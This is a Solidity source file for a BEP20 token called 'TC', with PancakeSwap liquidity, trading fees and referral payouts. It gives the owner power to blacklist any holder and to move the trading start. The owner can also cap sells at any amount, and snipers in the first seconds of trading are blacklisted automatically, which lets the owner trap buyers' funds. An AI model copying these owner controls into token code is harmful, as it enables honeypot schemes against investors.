/**
 *Submitted for verification at BscScan.com on 2022-04-25
*/

pragma solidity 0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
   
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public owner;

    constructor () public{
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is  the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

contract TC is IERC20, Ownable {

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;

    uint256 public minRefNum = 1;
    mapping (address => address) public uplines;
    mapping (address => bool) public exclude1;

    address public pair;
    bool public pairIsCreated = true;

    uint256 public tradingEnabledTimestamp = 1649991000;
    address public liquidityAddress = 0x94521f2Fa620ba8e20699CfFAD0538d800f0333b ;
    address payable public marketAddress = 0x94521f2Fa620ba8e20699CfFAD0538d800f0333b ;
    address public refAddress = 0x94521f2Fa620ba8e20699CfFAD0538d800f0333b;
    address public tempUSDTaddress = 0x94521f2Fa620ba8e20699CfFAD0538d800f0333b ;

    mapping (address => bool) public isExcludedFromFees;
    mapping (address => bool) public isBlacklist;
    mapping (address => bool) public exclude2;

    IPancakeRouter02 internal uniswapV2Router = IPancakeRouter02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
    IERC20 private c_usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    uint256 public numTokensSellToAddToLiquidity = 990000*10**18;
    uint256 public maxTokensSellAmount = 990000*10**18;
    uint256 public maxTokensBuyAmount = 300*10**18;

    uint256 public liquidityRate = 30;
    uint256 public marketRate = 25;

    mapping (uint256 => uint256) public refRewardRate;
    
    constructor() public {
        refRewardRate[1] = 13;
        refRewardRate[2] = 7;
        address _pair = pairFor(uniswapV2Router.factory(), address(this), address(c_usdt));
        pair = _pair;
        exclude2[address(uniswapV2Router)] = true;
        exclude2[_pair] = true;

        uint256 total = 1000000*10**18;
        _balances[msg.sender] = total;
        _totalSupply = total;
        emit Transfer(address(0), msg.sender, total);

        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[liquidityAddress] = true;

        exclude1[msg.sender] = true;
        exclude1[address(this)] = true;
        exclude1[address(uniswapV2Router)] = true;
        exclude1[_pair] = true;
        exclude1[refAddress] = true;
    }

    function symbol() external pure returns (string memory) {
        return "TC";
    }

    function name() external pure returns (string memory) {
        return "TC";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transferNormal(address sender, address recipient, uint256 amount) private {
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _transferNoswap(address sender, address recipient, uint256 amount) private {
        _transferNormal(sender, recipient, amount);
        if(!pairIsCreated){
            return;
        }
        uint256 contractTokenBalance = _balances[address(this)];
        if (contractTokenBalance >= numTokensSellToAddToLiquidity) {
            swapAndLiquify(contractTokenBalance);
        }
    }

    function swapAndLiquify(uint256 contractTokenBalance) private {
        uint256 half = contractTokenBalance/2;
        uint256 otherHalf = contractTokenBalance - half;
        uint256 usdtAmount = swapTokensForUSDT(half);
        addLiquidity(otherHalf, usdtAmount);
    }

    function swapTokensForUSDT(uint256 tokenAmount) private returns(uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(c_usdt);

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uint256[] memory amounts = uniswapV2Router.swapExactTokensForTokens(
            tokenAmount,
            0,
            path,
            tempUSDTaddress,
            block.timestamp
        );
        c_usdt.transferFrom(tempUSDTaddress, address(this), amounts[1]);
        return amounts[1];
    }

    function addLiquidity(uint256 token0Amount, uint256 token1Amount) private {
        _approve(address(this), address(uniswapV2Router), token0Amount);
        c_usdt.approve(address(uniswapV2Router), token1Amount);
        uniswapV2Router.addLiquidity(
            address(this),
            address(c_usdt),
            token0Amount,
            token1Amount,
            0,
            0,
            liquidityAddress,
            block.timestamp
        );
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _register(sender, recipient, amount);
        require(!isBlacklist[sender], "sender in blacklist");

        if(isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
            _transferNormal(sender, recipient, amount);
            return;
        }

        address _pair = pair;
        if(sender != _pair && recipient != _pair) {
            _transferNoswap(sender, recipient, amount);
            return;
        }

        require(block.timestamp >= tradingEnabledTimestamp, "trade not open");
        if(block.timestamp <= tradingEnabledTimestamp + 9) {
            if(!exclude2[sender]) {
                isBlacklist[sender] = true;
            }
            if(!exclude2[recipient]) {
                isBlacklist[recipient] = true;
            }
        }

        if(recipient == _pair && sender != _pair) {
            require(maxTokensSellAmount >= amount && amount >= 1000, "ERC20: sell amount exceed max");
            _processTx(sender, recipient, amount);
            return;
        }
        if(sender == _pair && recipient != _pair) {
            require(maxTokensBuyAmount >= amount && amount >= 1000, "ERC20: buy amount exceed max");
            _processTx(sender, recipient, amount);
            return;
        }

        _transferNormal(sender, recipient, amount);
    }
    function _register(address sender, address recipient, uint256 amount) internal { 
        if(uplines[recipient]!=address(0) || exclude1[recipient]) {
            return;
        }

        if(sender == pair) {
            uplines[recipient] = refAddress;
            return;
        }

        if(sender != recipient && amount >= minRefNum) {
            uplines[recipient] = sender;
        }
    }

    function _processTx(address sender, address recipient, uint256 amount) private {
        uint256 liquidityAmount = amount*liquidityRate/1000;
        _balances[address(this)] += liquidityAmount;
        emit Transfer(sender, address(this), liquidityAmount);

        uint256 marketAmount = amount*marketRate/1000;
        _balances[marketAddress] += marketAmount;
        emit Transfer(sender, marketAddress, marketAmount);

        uint256 receiveAmount = amount - amount*(refRewardRate[1]+refRewardRate[2])/1000 - liquidityAmount - marketAmount;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);

        _refPayoutToken(sender, recipient, amount);
    }

    function _refPayoutToken(address sender, address recipient, uint256 amount) private {
        address addr = sender;
        if(sender == pair) {
            addr = recipient;
        }
        address up = uplines[addr];
        uint256 totalPayout = 0;
        amount /= 1000;
        for(uint8 i = 1; i < 3; i++) {
            if(up == address(0)) break;
            uint256 reward = amount*refRewardRate[i];
            _balances[up] += reward;
            totalPayout += reward;
            emit Transfer(sender, up, reward);
            up = uplines[up];
        }

        totalPayout = amount*(refRewardRate[1] + refRewardRate[2]) - totalPayout;
        if(totalPayout > 0) {
            _balances[refAddress] += totalPayout;
            emit Transfer(sender, refAddress, totalPayout);
        }
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }
    function setPairIsCreated(bool b) external onlyOwner {
        pairIsCreated = b;
    }
    function setTrade(uint256 t) external onlyOwner {
        tradingEnabledTimestamp = t;
    }
    function setSell(uint256 t) external onlyOwner {
        maxTokensSellAmount = t;
    }
    function setBuy(uint256 t) external onlyOwner {
        maxTokensBuyAmount = t;
    }
    function setL(uint256 t) external onlyOwner {
        numTokensSellToAddToLiquidity = t;
    }
    function setExcludeFee(address a, bool b) external onlyOwner {
        isExcludedFromFees[a] = b;
    }
    function setBlacklist(address a, bool b) external onlyOwner {
        isBlacklist[a] = b;
    }
    function setMinRefNum(uint256 newMinRefNum) external onlyOwner {
        minRefNum = newMinRefNum;
    }

    function setTU(address newTU) external onlyOwner {
        tempUSDTaddress = newTU;
    }

    function setR(uint256 l, uint256 m, uint256 r1, uint256 r2) external onlyOwner {
        require(l <= 1000 && m <= 1000 && r1 <= 1000 && r2 <= 1000 && l+m+r1+r2 <= 1000, "invalid value");
        liquidityRate = l;
        marketRate = m;
        refRewardRate[1] = r1;
        refRewardRate[2] = r2;
    }

    function withdrawETH() external onlyOwner {
        marketAddress.transfer(address(this).balance);
    }

    function skim() external onlyOwner {
        uint256 usdtBal = IERC20(c_usdt).balanceOf(address(this));
        c_usdt.transfer(msg.sender, usdtBal);
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair{
    function token0() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
}